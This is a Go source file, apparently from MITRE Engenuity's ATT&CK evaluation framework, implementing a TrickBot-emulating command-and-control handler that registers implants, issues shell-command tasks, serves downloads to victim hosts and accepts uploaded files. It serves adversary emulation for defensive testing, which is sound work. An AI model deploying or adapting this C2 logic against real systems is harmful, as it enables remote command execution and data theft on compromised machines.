package trickbot

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"time"
	"crypto/md5"
	"encoding/hex"

	// "path/filepath"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/handlers/trickbot/helper"
	"attackevals.mitre-engenuity.org/control_server/logger"
	"github.com/gorilla/mux"
)

var campaignId = "camp1"
var payloads = "handlers/trickbot/payloads"

// enum of client command id's
const (
	Register         = 0
	KeepAlive        = 1
	Download         = 5
	UploadFile	 = 6
	LogCmdExec       = 10
	LogModuleResult  = 14
	UpdateConfig     = 23
	UpdateBot        = 25
	GetInjectTraffic = 63
	Exfiltrate       = 64
	GetTasks         = 80
)

// enum of server command id's
const (
	DownloadAndExec         = 42
	ExecuteCommand          = 50
	DownloadAndInjectModule = 62
)

// declare registration route format
var RestAPIaddress = ""
var registrationRoute = fmt.Sprintf("/%s/{%s}/%s/{%s}/{%s}/{%s}/{%s}/{%s}/{%s}/{%s}/{%s}", campaignId, "client_id", strconv.Itoa(Register), "winver", "hardcoded_id", "external_ip", "sha256_adapaters_info", "cwd", "pid", "ppid", "random_string")
var getTaskRoute = fmt.Sprintf("/%s/{%s}/%s/{%s}", campaignId, "client_id", strconv.Itoa(GetTasks), "guid")
var setTaskOutputRoute = fmt.Sprintf("/%s/{%s}/%s/{%s}", campaignId, "client_id", strconv.Itoa(LogCmdExec), "guid")
var downloadRoute = fmt.Sprintf("/%s/{%s}/%s/{%s}/{%s}", campaignId, "client_id", strconv.Itoa(Download), "filename", "guid")
var uploadRoute = fmt.Sprintf("/%s/{%s}/%s/{%s}/{%s}", campaignId, "client_id", strconv.Itoa(UploadFile), "filename", "guid")

var Server *http.Server

// Represents the TrickBot C2 handler. Will implement the util.Handler interface.
type TrickbotHandler struct {}

// Creates and adds the HttpsHandler to the map of available C2 handlers.
func init() {
	util.AvailableHandlers["trickbot"] = &TrickbotHandler{}
}

//setup route handlers and go functions for server start/stop
func (t *TrickbotHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
	listenAddr, err := config.GetHostPortString(configEntry)
	if err != nil {
		return err
	}
	logger.Info("Starting Trickbot Handler")

	// make sure we know REST API address
	RestAPIaddress = restAddress

	r := mux.NewRouter()
	r.HandleFunc(registrationRoute, HandleRegisterImplant).Methods("GET")
	r.HandleFunc(getTaskRoute, HandleGetTask).Methods("GET")
	r.HandleFunc(setTaskOutputRoute, HandlePostTaskOutput).Methods("POST")
	r.HandleFunc(downloadRoute, HandleGetFileFromServer).Methods("GET")
	r.HandleFunc(uploadRoute, HandlePostFileToServer).Methods("POST")

	Server = &http.Server{
		Addr:         listenAddr,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      r,
	}
	// start rest api in goroutine so it doesn't block
	go func() {
		err := Server.ListenAndServe()
		if err != nil && err.Error() != "http: Server closed" {
			logger.Error(err)
		}
	}()
	return nil
}

// StopHandler disables the REST API server
func (t *TrickbotHandler) StopHandler() error {
	emptyContext := context.Background()
	return Server.Shutdown(emptyContext)
}

// endpoint format: campaign id/client_id/command_id/winver/hardcoded_id/external_ip/sha256_adapaters_info/cwd/pid/ppid/random_string
// returns the URL path back to the client (for testing)
func HandleRegisterImplant(w http.ResponseWriter, r *http.Request) {
	logger.Info(fmt.Sprintf("Registration Event: %s", r.URL.Path))
	req := helper.GetRegistrationInfo(r.URL.Path)
	response, err := forwardRegisterImplant(req)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, response)
}

func forwardRegisterImplant(implantData []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

func HandleGetTask(w http.ResponseWriter, r *http.Request) {
	logger.Info(fmt.Sprintf("Task Event: %s", r.URL.Path))
	vars := mux.Vars(r)
	client_id := vars["client_id"]
	guid := vars["guid"]
	response, err := forwardGetTask(guid)
	if err != nil {
		fmt.Fprint(w, err)
	}
	if response != ""{

	    serverExecCmd := fmt.Sprintf("/%s/%s/%s/cmd=%s", campaignId, client_id, strconv.Itoa(ExecuteCommand), response)
	    fmt.Fprint(w, serverExecCmd)
	}else{
	    serverExecCmd := fmt.Sprintf("/%s/%s/%s/%s", campaignId, client_id, strconv.Itoa(ExecuteCommand), response)
	    fmt.Fprint(w, serverExecCmd)
	}
}

func forwardGetTask(guid string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/" + guid
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	sessionData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

func HandlePostTaskOutput(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	guid := vars["guid"]
	req, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	taskOutput := string(req)
	response, err := forwardPostTaskOutput(guid, taskOutput)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, response)
}
func forwardPostTaskOutput(guid string, output string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/output/" + guid

	// setup HTTP POST request
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(output))
	if err != nil {
		return "", err
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	if response.StatusCode != 200 {
		e := fmt.Sprintf("Expected error code 200, got %v", response.StatusCode)
		err = errors.New(e)
		return "", err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

// GetFileFromServer handls file downloads from control server to victim system
func HandleGetFileFromServer(w http.ResponseWriter, r *http.Request) {
	logger.Info(fmt.Sprintf("Get File Event: %s", r.URL.Path))
	fileName := helper.GetDownloadTaskFilename(r.URL.Path)

	fileData, err := ForwardGetFileFromServer(fileName)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprint(w, fileData)
}

func ForwardGetFileFromServer(fileName string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/files/" + fileName
	resp, err := http.Get(url)
	// if err != nil {
	// 	return "", err
	// }
	fileData, err := ioutil.ReadAll(resp.Body)
	h := md5.Sum(fileData)
	actualHash := hex.EncodeToString(h[:])
	logger.Info(fmt.Sprintf("HASH: %s", actualHash))

	// if err != nil {
	// 	return "", err
	// }
	// WORKAROUND - I converted the fileData to a string because []byte converted it to an ASCII array of bytes
	return string(fileData), err
}

func HandlePostFileToServer(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	fileName := vars["filename"]

	fileData, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	response, err := ForwardPostFileToServer(fileName, fileData)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprint(w, response)
}

func ForwardPostFileToServer(fileName string, fileData []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/upload/" + fileName
	resp, err := http.Post(url, "applicaiton/octet-stream", bytes.NewBuffer(fileData))
	if err != nil {
		return "", err
	}

	result, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(result), err
}

